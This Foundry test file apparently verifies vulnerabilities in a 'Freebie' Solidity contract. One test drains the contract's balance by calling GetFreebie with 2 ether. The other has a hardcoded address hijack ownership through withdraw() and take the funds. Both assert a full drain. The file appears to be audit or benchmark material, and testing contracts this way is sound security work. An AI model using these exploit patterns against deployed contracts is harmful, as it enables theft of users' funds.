// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "../src/0xe82f0742a71a02b9e9ffc142fdcb6eb1ed06fb87.sol";

contract FreebieTest is Test {
    Freebie freebie;
    address owner = address(0x1234);
    address fixedAddress = 0x30ad12df80a2493a82DdFE367d866616db8a2595;
    address attacker = makeAddr("attacker");
    
    function setUp() public {
        vm.startPrank(owner);
        freebie = new Freebie();
        // Initialize contract with funds
        vm.deal(address(freebie), 10 ether);
        vm.stopPrank();
    }

    // Test contract drains balance when GetFreebie called with >1 ETH
    function test_GetFreebie_DenialOfService() public {
        // Capture initial contract balance
        console.log("--- BEFORE-Trigger Contract Balance ---");
        uint256 contractBalanceBefore = freebie.getContractBalance();
        console.log("Initial Contract Balance: %s", contractBalanceBefore);

        // Attacker calls with >1 ETH
        vm.deal(attacker, 2 ether);
        console.log("--- Trigger: GetFreebie with 2 ether ---");
        vm.prank(attacker);
        freebie.GetFreebie{value: 2 ether}();

        // Capture post-attack contract balance
        console.log("--- AFTER-Trigger Contract Balance ---");
        uint256 contractBalanceAfter = freebie.getContractBalance();
        console.log("Contract Balance After Attack: %s", contractBalanceAfter);

        // Vulnerability verdict
        bool vulnerabilityExists = (contractBalanceAfter == 0);
        console.log("Verdict: Vulnerability %s", 
                    vulnerabilityExists ? "Exists - Contract drained" : "Not Exist - Contract has remaining ETH");

        // Final result message per requirements
        if (vulnerabilityExists) {
            console.log("Vulnerability Exists: Contract balance fully drained by GetFreebie attack");
        } else {
            console.log("Vulnerability not Exist: Contract balance not fully drained (%s remaining)", contractBalanceAfter);
        }

        assertEq(contractBalanceAfter, 0, "Contract balance not drained");
    }

    // Test ownership hijack and fund theft via withdraw()
    function test_Withdraw_HijackAndDrain() public {
        // Capture initial contract balance
        console.log("--- BEFORE-Trigger Contract Balance ---");
        uint256 contractBalanceBefore = freebie.getContractBalance();
        console.log("Initial Contract Balance: %s", contractBalanceBefore);

        // Fixed address claims ownership and withdraws
        console.log("--- Trigger: fixedAddress withdraw() ---");
        vm.prank(fixedAddress);
        freebie.withdraw();

        // Capture post-attack contract balance
        console.log("--- AFTER-Trigger Contract Balance ---");
        uint256 contractBalanceAfter = freebie.getContractBalance();
        console.log("Contract Balance After Attack: %s", contractBalanceAfter);

        // Vulnerability verdict
        bool vulnerabilityExists = (contractBalanceAfter == 0);
        console.log("Verdict: Vulnerability %s", 
                    vulnerabilityExists ? "Exists - Contract drained" : "Not Exist - Contract has remaining ETH");

        // Final result message per requirements
        if (vulnerabilityExists) {
            console.log("Vulnerability Exists: Contract drained via ownership hijack");
        } else {
            console.log("Vulnerability not Exist: Contract funds not stolen (%s remaining)", contractBalanceAfter);
        }

        assertEq(contractBalanceAfter, 0, "Funds not stolen via hijack");
    }
}